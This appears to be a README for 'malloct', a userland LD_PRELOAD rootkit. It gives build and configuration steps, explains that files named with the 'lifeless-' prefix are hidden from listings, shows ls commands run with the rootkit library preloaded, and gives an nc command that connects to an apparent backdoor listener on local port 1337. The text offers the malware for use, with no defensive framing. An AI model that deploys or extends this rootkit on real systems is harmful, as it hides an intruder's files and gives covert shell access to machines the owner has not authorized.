# malloct
LD_PRELOAD rootkit

# make
$ make

# usage
**make your own configuration in src/config.h**

**is a core LD_PRELOAD rootkit**

**default prefix is lifeless-**

$ LD_PRELOAD=./libmalloct.so ls -aphl /home/$USER/

$ LD_PRELOAD=./libmalloct.so ls -hl /tmp/*

# nc
**you can set custom port in src/config.h**

nc -vn 127.0.0.1 1337

# example
![image](https://github.com/user-attachments/assets/67132173-bd65-4e18-a991-8664cd155849)
